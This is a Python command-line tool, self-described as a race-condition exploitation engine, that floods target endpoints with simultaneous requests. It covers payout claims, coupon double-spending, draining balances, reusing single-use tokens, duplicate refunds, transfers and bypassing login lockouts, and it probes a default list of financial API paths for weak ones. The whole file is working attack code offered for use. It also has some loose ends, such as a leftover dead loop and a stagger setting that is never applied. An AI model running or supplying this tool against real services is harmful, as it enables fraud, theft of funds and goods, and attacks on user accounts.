#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Race Condition Automator v2 — Hot payout, token reuse, cart abuse, double-spend
Automated concurrent request engineering for race condition exploitation
Version: 2.0
"""
import sys
import os
import json
import time
import threading
import queue
import argparse
import urllib.request
import urllib.error
import socket
import struct
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Callable, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import statistics

VERSION = "2.1"
LOG_DIR = Path(__file__).parent / "log"
LOG_DIR.mkdir(exist_ok=True)


# ============================================================================
# Race Condition Attack Types (8+)
# ============================================================================
class RaceConditionEngine:
    """Automated race condition exploitation engine with 8+ attack types."""

    # Timing configuration
    DEFAULT_WINDOW_MS = 50        # Detection window in ms
    DEFAULT_CONCURRENCY = 20      # Default thread count
    DEFAULT_REQUESTS = 20         # Default request count
    MIN_TIMING_GAP_MS = 5         # Minimum gap to consider race

    def __init__(self, concurrency: int = DEFAULT_CONCURRENCY, timeout: float = 5.0):
        self.concurrency = concurrency
        self.timeout = timeout
        self.results: List[Dict] = []
        self.stats = {
            "total_attempts": 0,
            "success_count": 0,
            "fail_count": 0,
            "race_detected": False,
            "timing_data": [],
            "attack_types_tested": [],
        }

    # -------------------------------------------------------------------------
    # Core HTTP request
    # -------------------------------------------------------------------------
    def _make_request(
        self,
        method: str,
        url: str,
        headers: Dict,
        body: Optional[bytes] = None,
        session_cookie: Optional[str] = None,
        delay: float = 0.0,
    ) -> Dict:
        """Execute a single HTTP request with optional pre-delay."""
        req_headers = dict(headers)
        if session_cookie:
            req_headers["Cookie"] = session_cookie

        req = urllib.request.Request(url, method=method.upper())
        for k, v in req_headers.items():
            req.add_header(k, v)

        if delay > 0:
            time.sleep(delay)

        start = time.perf_counter()
        try:
            if body:
                req.data = body
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                elapsed = time.perf_counter() - start
                status = resp.status
                body_text = resp.read().decode("utf-8", errors="replace")[:500]
                return {
                    "status": status,
                    "elapsed": round(elapsed * 1000, 2),
                    "body": body_text,
                    "success": 200 <= status < 300,
                }
        except urllib.error.HTTPError as e:
            elapsed = time.perf_counter() - start
            return {
                "status": e.code,
                "elapsed": round(elapsed * 1000, 2),
                "body": e.read().decode("utf-8", errors="replace")[:500],
                "success": False,
            }
        except Exception as e:
            elapsed = time.perf_counter() - start
            return {
                "status": 0,
                "elapsed": round(elapsed * 1000, 2),
                "body": str(e),
                "success": False,
            }

    # -------------------------------------------------------------------------
    # Worker threads
    # -------------------------------------------------------------------------
    def _worker(
        self,
        task_queue: queue.Queue,
        result_queue: queue.Queue,
        method: str,
        url: str,
        headers: Dict,
        body: Optional[bytes],
    ):
        """Worker thread for concurrent requests."""
        while True:
            try:
                item = task_queue.get_nowait()
                idx = item["index"]
                delay = item.get("delay", 0.0)
                result = self._make_request(method, url, headers, body, delay=delay)
                result["index"] = idx
                result_queue.put(result)
                task_queue.task_done()
            except queue.Empty:
                break

    # -------------------------------------------------------------------------
    # Core concurrent executor
    # -------------------------------------------------------------------------
    def execute_concurrent(
        self,
        method: str,
        url: str,
        headers: Dict,
        body: Optional[bytes] = None,
        count: int = DEFAULT_REQUESTS,
        label: str = "race_test",
        stagger_ms: float = 0.0,
    ) -> Dict:
        """Execute N concurrent requests and analyze timing."""
        tasks: List[Dict] = [{"index": i} for i in range(count)]
        task_queue = queue.Queue()
        result_queue = queue.Queue()

        for t in tasks:
            task_queue.put(t)

        threads = []
        n_threads = min(self.concurrency, count)
        for _ in range(n_threads):
            t = threading.Thread(
                target=self._worker,
                args=(task_queue, result_queue, method, url, headers, body),
            )
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=self.timeout)

        results: List[Dict] = []
        while not result_queue.empty():
            results.append(result_queue.get())

        results.sort(key=lambda x: x.get("elapsed", 0))

        timings = [r["elapsed"] for r in results]
        avg_time = sum(timings) / len(timings) if timings else 0
        min_time = min(timings) if timings else 0
        max_time = max(timings) if timings else 0
        median_time = statistics.median(timings) if timings else 0
        stdev_time = statistics.stdev(timings) if len(timings) > 1 else 0

        # Detect race: multiple successes within tight window
        successes = [r for r in results if r.get("success")]
        race_detected = len(successes) > 1 and (max_time - min_time) < self.DEFAULT_WINDOW_MS

        self.stats["total_attempts"] += count
        self.stats["success_count"] += len(successes)
        self.stats["fail_count"] += len(results) - len(successes)
        self.stats["race_detected"] = race_detected or self.stats["race_detected"]
        self.stats["timing_data"].append({
            "label": label,
            "count": count,
            "avg_ms": round(avg_time, 2),
            "min_ms": round(min_time, 2),
            "max_ms": round(max_time, 2),
            "median_ms": round(median_time, 2),
            "stdev_ms": round(stdev_time, 2),
            "successes": len(successes),
            "race_detected": race_detected,
        })

        return {
            "label": label,
            "url": url,
            "method": method,
            "concurrency": count,
            "timing": {
                "avg_ms": round(avg_time, 2),
                "min_ms": round(min_time, 2),
                "max_ms": round(max_time, 2),
                "median_ms": round(median_time, 2),
                "stdev_ms": round(stdev_time, 2),
                "spread_ms": round(max_time - min_time, 2),
            },
            "successes": len(successes),
            "failures": len(results) - len(successes),
            "race_detected": race_detected,
            "results": results,
        }

    # =========================================================================
    # 8+ Race Condition Attack Types
    # =========================================================================

    def hot_payout_test(
        self, url: str, headers: Dict, body: bytes, count: int = 20
    ) -> Dict:
        """Test hot payout race condition — fire multiple claims simultaneously."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="hot_payout"
        )

    def coupon_redeem_test(
        self, url: str, headers: Dict, body: bytes, count: int = 10
    ) -> Dict:
        """Test coupon/voucher double-spend — redeem same code concurrently."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="coupon_redeem"
        )

    def balance_withdraw_test(
        self, url: str, headers: Dict, body: bytes, count: int = 20
    ) -> Dict:
        """Test concurrent withdrawal race — drain balance multiple times."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="balance_withdraw"
        )

    def token_reuse_test(
        self, url: str, headers: Dict, body: bytes, count: int = 10
    ) -> Dict:
        """Test single-use token reuse — send token N times at once."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="token_reuse"
        )

    def cart_quantity_test(
        self, url: str, headers: Dict, body: bytes, count: int = 15
    ) -> Dict:
        """Test cart quantity race — order more than available stock."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="cart_quantity"
        )

    def transfer_race_test(
        self, url: str, headers: Dict, body: bytes, count: int = 20
    ) -> Dict:
        """Test financial transfer race — send money to self concurrently."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="transfer_race"
        )

    def refund_race_test(
        self, url: str, headers: Dict, body: bytes, count: int = 15
    ) -> Dict:
        """Test refund race — trigger multiple refunds for same order."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="refund_race"
        )

    def login_lockout_bypass_test(
        self, url: str, headers: Dict, body: bytes, count: int = 20
    ) -> Dict:
        """Test login lockout bypass — beat the rate limiter with concurrent logins."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="login_lockout_bypass"
        )

    def inventory_reserve_test(
        self, url: str, headers: Dict, body: bytes, count: int = 15
    ) -> Dict:
        """Test inventory race — reserve same item for multiple users."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="inventory_reserve"
        )

    def double_spend_test(
        self, url: str, headers: Dict, body: bytes, count: int = 20, label: str = "double_spend"
    ) -> Dict:
        """Automated double-spend — send identical transactions simultaneously."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label=label
        )

    def staggered_attack_test(
        self, url: str, headers: Dict, body: bytes, count: int = 30, stagger_ms: float = 1.0
    ) -> Dict:
        """Staggered race attack — spread requests with micro-delays to find exact window."""
        return self.execute_concurrent(
            "POST", url, headers, body, count=count, label="staggered", stagger_ms=stagger_ms
        )

    # -------------------------------------------------------------------------
    # Concurrent analysis
    # -------------------------------------------------------------------------
    def analyze_concurrency(
        self, url: str, headers: Dict, body: bytes, counts: List[int] = None
    ) -> Dict:
        """Run race tests at multiple concurrency levels to find optimal window."""
        if counts is None:
            counts = [5, 10, 20, 50, 100]

        results = []
        for c in counts:
            r = self.execute_concurrent(
                "POST", url, headers, body, count=c, label=f"concurrency_{c}"
            )
            results.append({
                "count": c,
                "successes": r["successes"],
                "race_detected": r["race_detected"],
                "spread_ms": r["timing"]["spread_ms"],
            })

        # Find optimal concurrency (max successes with min spread)
        best = max(results, key=lambda x: (x["successes"], -(x["spread_ms"])))
        return {
            "target": url,
            "results": results,
            "optimal_concurrency": best["count"],
            "optimal_successes": best["successes"],
            "optimal_spread_ms": best["spread_ms"],
            "recommended_count": best["count"],
        }

    # -------------------------------------------------------------------------
    # Vulnerable endpoint detection
    # -------------------------------------------------------------------------
    def detect_vulnerable_endpoints(
        self, base_url: str, endpoints: List[str], headers: Dict, test_body: bytes
    ) -> List[Dict]:
        """Probe multiple endpoints to find race-vulnerable ones."""
        vulnerable = []
        for ep in endpoints:
            url = f"{base_url.rstrip('/')}/{ep.lstrip('/')}"
            r = self.execute_concurrent("POST", url, headers, test_body, count=10, label=ep)
            if r["race_detected"] or r["successes"] > 5:
                vulnerable.append({
                    "endpoint": url,
                    "successes": r["successes"],
                    "race_detected": r["race_detected"],
                    "spread_ms": r["timing"]["spread_ms"],
                })
        return vulnerable

    def get_stats(self) -> Dict:
        return dict(self.stats)


# ============================================================================
# CLI Interface
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description=f"Race Condition Automator v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  --hot-payout     Hot payout (multiple claim submissions)
  --coupon         Coupon double-spend
  --withdraw       Balance withdrawal race
  --token-reuse    Single-use token reuse
  --cart           Cart quantity race
  --transfer       Financial transfer race
  --refund         Refund race
  --login-bypass   Login lockout bypass
  --inventory      Inventory reservation race
  --double-spend   Generic double-spend
  --staggered      Staggered micro-delay attack
  --analyze        Multi-concurrency analysis
  --probe          Probe multiple endpoints
        """,
    )
    parser.add_argument("--hot-payout", metavar="URL", help="Hot payout test")
    parser.add_argument("--coupon", metavar="URL", help="Coupon redeem test")
    parser.add_argument("--withdraw", metavar="URL", help="Balance withdraw test")
    parser.add_argument("--token-reuse", metavar="URL", help="Token reuse test")
    parser.add_argument("--cart", metavar="URL", help="Cart quantity test")
    parser.add_argument("--transfer", metavar="URL", help="Transfer race test")
    parser.add_argument("--refund", metavar="URL", help="Refund race test")
    parser.add_argument("--login-bypass", metavar="URL", help="Login lockout bypass")
    parser.add_argument("--inventory", metavar="URL", help="Inventory reserve test")
    parser.add_argument("--double-spend", metavar="URL", help="Double-spend test")
    parser.add_argument("--staggered", metavar="URL", help="Staggered attack test")
    parser.add_argument("--analyze", metavar="URL", help="Multi-concurrency analysis")
    parser.add_argument("--probe", metavar="URL", help="Probe endpoints for races")
    parser.add_argument("--endpoints", "-e", nargs="*", help="Endpoints to probe")
    parser.add_argument("--body", "-b", metavar="JSON", help="Request body (JSON)")
    parser.add_argument("--header", "-H", nargs="*", help="Custom headers")
    parser.add_argument("--count", "-c", type=int, default=20, help="Concurrent requests (default: 20)")
    parser.add_argument("--concurrency", "-C", type=int, default=20, help="Thread pool size")
    parser.add_argument("--stagger-ms", "-s", type=float, default=0.0, help="Stagger delay in ms")
    parser.add_argument("--json", "-j", action="store_true", help="JSON output")
    parser.add_argument("--window", "-w", type=int, default=50, help="Race detection window ms (default: 50)")

    args = parser.parse_args()

    engine = RaceConditionEngine(concurrency=args.concurrency)
    engine.DEFAULT_WINDOW_MS = args.window

    headers = {"Content-Type": "application/json"}
    body = args.body.encode() if args.body else None

    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    def print_result(result: Dict):
        if args.json:
            print(json.dumps(result, indent=2, default=str))
            return
        print(f"\n{'='*60}")
        print(f"  RACE CONDITION TEST: {result['label']}")
        print(f"{'='*60}")
        print(f"  Target: {result['url']}")
        print(f"  Concurrency: {result['concurrency']}")
        print(f"\n  Timing:")
        t = result["timing"]
        print(f"    Avg:  {t['avg_ms']}ms")
        print(f"    Min:  {t['min_ms']}ms")
        print(f"    Max:  {t['max_ms']}ms")
        print(f"    Med:  {t['median_ms']}ms")
        print(f"    StdD: {t['stdev_ms']}ms")
        print(f"    Spread: {t['spread_ms']}ms")
        print(f"\n  Results:")
        print(f"    Successes: {result['successes']}")
        print(f"    Failures:  {result['failures']}")
        print(f"    RACE DETECTED: {'*** YES ***' if result['race_detected'] else 'NO'}")
        if result["race_detected"]:
            print(f"\n  [!!!] Race condition likely exploitable!")
            print(f"  [!!!] {result['successes']} requests succeeded within {t['spread_ms']}ms window")

    # Map attack types
    attack_map = {
        "hot_payout": getattr(engine, "hot_payout_test"),
        "coupon": getattr(engine, "coupon_redeem_test"),
        "withdraw": getattr(engine, "balance_withdraw_test"),
        "token_reuse": getattr(engine, "token_reuse_test"),
        "cart": getattr(engine, "cart_quantity_test"),
        "transfer": getattr(engine, "transfer_race_test"),
        "refund": getattr(engine, "refund_race_test"),
        "login_bypass": getattr(engine, "login_lockout_bypass_test"),
        "inventory": getattr(engine, "inventory_reserve_test"),
        "double_spend": getattr(engine, "double_spend_test"),
        "staggered": lambda u, h, b, c, s: engine.staggered_attack_test(u, h, b, c, s),
    }

    result = None
    label_map = {
        "hot_payout": "Hot Payout",
        "coupon": "Coupon Redeem",
        "withdraw": "Balance Withdraw",
        "token_reuse": "Token Reuse",
        "cart": "Cart Quantity",
        "transfer": "Transfer Race",
        "refund": "Refund Race",
        "login_bypass": "Login Lockout Bypass",
        "inventory": "Inventory Reserve",
        "double_spend": "Double Spend",
        "staggered": "Staggered Attack",
    }

    for key, attr_name in attack_map.items():
        flag = f"--{key.replace('_', '-')}"
        url = getattr(args, key.replace("_", "").replace("-", "_").replace("staggerms", "stagger"), None)
        # Try alternate naming
        alt = key.replace("_", "")
        val = getattr(args, alt, None)
        if val is not None:
            url = val
            break

    # Re-do with proper flag parsing
    flags = {
        "hot_payout": args.hot_payout,
        "coupon": args.coupon,
        "withdraw": args.withdraw,
        "token_reuse": args.token_reuse,
        "cart": args.cart,
        "transfer": args.transfer,
        "refund": args.refund,
        "login_bypass": args.login_bypass,
        "inventory": args.inventory,
        "double_spend": args.double_spend,
        "staggered": args.staggered,
        "analyze": args.analyze,
        "probe": args.probe,
    }

    for flag_name, url in flags.items():
        if url:
            if flag_name == "analyze":
                result = engine.analyze_concurrency(url, headers, body)
                if args.json:
                    print(json.dumps(result, indent=2, default=str))
                else:
                    print(f"\n{'='*60}")
                    print(f"  CONCURRENCY ANALYSIS: {url}")
                    print(f"{'='*60}")
                    print(f"  {'Count':>8} {'Successes':>10} {'Race':>6} {'Spread(ms)':>12}")
                    print(f"  {'-'*40}")
                    for r in result["results"]:
                        race_mark = "***" if r["race_detected"] else "no"
                        print(f"  {r['count']:>8} {r['successes']:>10} {race_mark:>6} {r['spread_ms']:>12.2f}")
                    print(f"\n  [REC] Optimal concurrency: {result['optimal_concurrency']}")
                    print(f"  [REC] Max successes: {result['optimal_successes']}")
                    print(f"  [REC] Recommended count: {result['recommended_count']}")
                return
            elif flag_name == "probe":
                probe_endpoints = args.endpoints or [
                    "/api/transfer", "/api/withdraw", "/api/coupon/redeem",
                    "/api/claim", "/api/refund", "/api/purchase", "/api/login",
                    "/api/order/confirm", "/api/cart/checkout",
                ]
                result = engine.detect_vulnerable_endpoints(url, probe_endpoints, headers, body)
                if args.json:
                    print(json.dumps(result, indent=2, default=str))
                else:
                    print(f"\n{'='*60}")
                    print(f"  ENDPOINT PROBE: {url}")
                    print(f"{'='*60}")
                    if result:
                        for r in result:
                            race_mark = "*** VULNERABLE ***" if r["race_detected"] else "ok"
                            print(f"  [{race_mark}] {r['endpoint']}")
                            print(f"         Successes: {r['successes']} | Spread: {r['spread_ms']}ms")
                    else:
                        print("  No vulnerable endpoints found.")
                return
            else:
                count = args.stagger_ms if flag_name == "staggered" else args.count
                stagger = args.stagger_ms if flag_name == "staggered" else 0.0
                attr_name = attack_map[flag_name]
                if flag_name == "staggered":
                    result = attr_name(url, headers, body, args.count, stagger)
                else:
                    result = attr_name(url, headers, body, args.count)
                result["label"] = label_map.get(flag_name, flag_name)
                print_result(result)
                return

    parser.print_help()


if __name__ == "__main__":
    main()
